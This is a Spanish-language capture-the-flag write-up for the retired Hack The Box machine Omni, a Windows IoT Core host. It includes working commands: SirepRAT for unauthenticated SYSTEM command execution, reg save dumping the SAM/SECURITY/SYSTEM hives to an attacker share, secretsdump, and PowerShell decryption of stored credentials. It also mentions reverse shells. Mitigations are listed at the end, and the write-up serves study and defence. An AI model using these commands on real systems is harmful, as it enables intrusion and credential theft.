---
machine: Omni
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, windows-iot, sirep, sireprat, registry-hives, pscredential, clixml, wdp]
---

# Omni — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El host es Windows IoT Core. El servicio Sirep expuesto permite ejecutar comandos como SYSTEM con SirepRAT. Desde ahí se leen archivos `PSCredential` cifrados y se vuelcan las colmenas SAM/SYSTEM/SECURITY. El hash de `app` se crackea, se accede al Windows Device Portal y se descifra la credencial de usuario; un XML de administración revela la contraseña de `administrator`, con la que se obtiene la flag de root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p135,5985,8080,29817,29819,29820 <IP>
```

- 135 RPC, 5985 WinRM, 8080 Windows Device Portal.
- 29817, 29819 y 29820 son el servicio Sirep de Windows IoT Core.
- El portal pide autenticación básica y revela `Windows Device Portal`.

## Enumeración

El servicio Sirep no requiere autenticación y acepta comandos del sistema. Se clona SirepRAT y se comprueba la ejecución:

```bash
python3 SirepRAT.py <IP> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args ' /c whoami'
```

La respuesta es `nt authority\system`. El host no tiene `whoami.exe` en el PATH, pero el comando funciona con la ruta completa.

## Foothold

Con SYSTEM se leen los archivos de credenciales de los perfiles:

```bash
python3 SirepRAT.py <IP> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args ' /c type C:\Data\Users\app\user.txt'
```

`user.txt` es un `PSCredential` serializado con `Export-Clixml`; la contraseña está cifrada con DPAPI y depende del usuario. También se puede volcar el registro:

```bash
reg save HKLM\sam \\<LHOST>\share\sam
reg save HKLM\system \\<LHOST>\share\system
reg save HKLM\security \\<LHOST>\share\security
```

```bash
secretsdump.py -sam sam -security security -system system LOCAL
```

El hash de `app` se crackea fuera de línea con hashcat. La contraseña resultante `<APP_PASSWORD>` abre el Windows Device Portal en 8080.

## Movimiento lateral

En el portal, la sección de procesos permite ejecutar comandos. Se lanza una reverse shell como `app` y se descifra la credencial:

```powershell
(Import-CliXml -Path C:\Data\Users\app\user.txt).GetNetworkCredential().Password
```

En el mismo perfil, `iot-admin.xml` contiene una credencial para `administrator`; `app` puede descifrarla:

```powershell
$cred = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
$cred.GetNetworkCredential() | fl
```

## Escalada de privilegios

Con `<ADMIN_PASSWORD>` se vuelve a iniciar sesión en el Windows Device Portal como `administrator`. Se ejecuta otra reverse shell y se descifra `root.txt` con `Import-CliXml`.

```powershell
(Import-CliXml -Path C:\Data\Users\administrator\root.txt).GetNetworkCredential().Password
```

La cuenta es administrador local; la flag se redacta.

## Evidencia

- `whoami` como SYSTEM a través de Sirep.
- Nombres de los archivos `PSCredential`, sin contenido.
- `secretsdump` con hashes redactados.
- `Import-CliXml` y `whoami` como administrator.

## Lecciones aprendidas

- Windows IoT Core puede exponer Sirep sin autenticación.
- `Export-Clixml` protege con DPAPI, no con una clave independiente: el usuario puede descifrarlo.
- Un archivo de administración en el perfil de un usuario puede contener credenciales de mayor privilegio.

## Mitigaciones y detección

- Filtrar los puertos Sirep y no exponer Windows Device Portal a la red.
- Cambiar credenciales por defecto y no guardar `PSCredential` de administrador en perfiles de usuario.
- Restringir `reg save` y el acceso a SAM/SYSTEM/SECURITY.
- Alertar de ejecución remota vía Sirep, volcados de registro y accesos anómalos al portal.

## Referencias

- <https://www.hackthebox.com/machines/Omni>
- <https://github.com/SafeBreach-Labs/SirepRAT>
- <https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml>
- <https://attack.mitre.org/techniques/T1003/002/>
